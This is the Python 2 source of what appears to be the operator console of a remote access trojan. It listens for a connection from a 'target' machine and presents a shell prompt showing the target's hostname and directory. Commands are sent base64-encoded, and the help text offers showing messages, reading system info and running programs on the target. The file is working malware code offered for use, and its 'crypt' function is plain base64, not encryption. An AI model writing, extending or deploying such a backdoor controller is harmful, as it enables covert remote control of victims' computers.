#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
[~] Version: 0.2
"""

import socket
import os
import sys
import base64

reload(sys)
sys.setdefaultencoding("utf-8")

host = "127.0.0.1"
port = 8000

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(data):
    global pwd
    cli.sendall(crypt(data))
    pwd = crypt(cli.recv(1024), False)
    print(crypt(cli.recv(16384), False))

def help():
    print"""
Commands:
    message TEXT            : Show messages on target system.
    info()                  : Show target system's info.
    execute PROGRAM ARGS    : Execute programs in a new process\n"""
    menu()

def main():
    global s, cli, addr, hostname, pwd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    cli, addr = s.accept()

    pwd = crypt(cli.recv(1024), False)
    hostname = crypt(cli.recv(1024), False)

def menu():
    while True:
        command = raw_input("[%s@%s]-[%s]~$ "%(hostname, addr[0], pwd))
        if command == "help()":
            help()
            menu()

        elif ":" in command:
            os.system(command.replace(":", ""))
            menu()

        elif command == "": 
            command = " "

        else:
            send(command)
def start():
    while True:
        try:
            main()
            menu()
        except:
            start()

if __name__ == "__main__":
    start()
